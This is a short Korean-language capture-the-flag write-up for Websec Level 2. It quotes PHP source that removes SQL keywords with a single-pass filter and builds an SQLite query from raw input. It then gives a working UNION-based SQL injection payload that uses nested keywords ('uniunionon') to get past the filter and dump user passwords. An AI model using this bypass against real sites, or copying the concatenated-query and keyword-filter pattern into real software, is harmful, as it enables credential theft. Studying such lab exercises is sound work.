---
title : "Websec - Level 2"
excerpt : "Websec Level 2 - Easy"
toc : true
toc_sticky: true
categories:
  - Websec
tags:
  - sql injection
---

## 1. Source code

``` php
ini_set('display_errors', 'on');

class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');  #단어들 사이에 | 을 해준다는 것
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    $lt = new LevelTwo ();
    $userDetails = $lt->doQuery ($_POST['user_id']);
}
```
$userDetails 값이 존재하면 id,username을 출력해준다.  

## 2. Vulnerability

level1과 다른점은 필터링을 한다는 점이다. 근데 필터링하는 문자들을 공백으로 바꿔준다는 점에서 취약점이 발생한다.  
'uniunionon' 이런식으로 써준다면 필터링을 우회할 수 있다.


## 3. Solution

1 uniunionon selselectect 1,password frfromom users -- 라고 입력을 해주면 쿼리에는 ``` SELECT id,username FROM users WHERE id=1 union select 1,password from users -- LIMIT 1 ``` 로 들어가서 플래그를 얻는다. 